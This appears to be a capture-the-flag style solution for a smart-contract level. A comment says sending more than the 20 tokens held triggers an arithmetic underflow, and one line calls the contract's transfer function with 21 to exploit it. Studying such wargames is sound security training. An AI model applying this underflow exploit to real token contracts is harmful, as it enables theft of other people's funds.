/* You are given 20 tokens, and to trigger an arithmetic underflow \
 * you just need to send more than that.
*/
await contract.transfer(contract.address, 21)
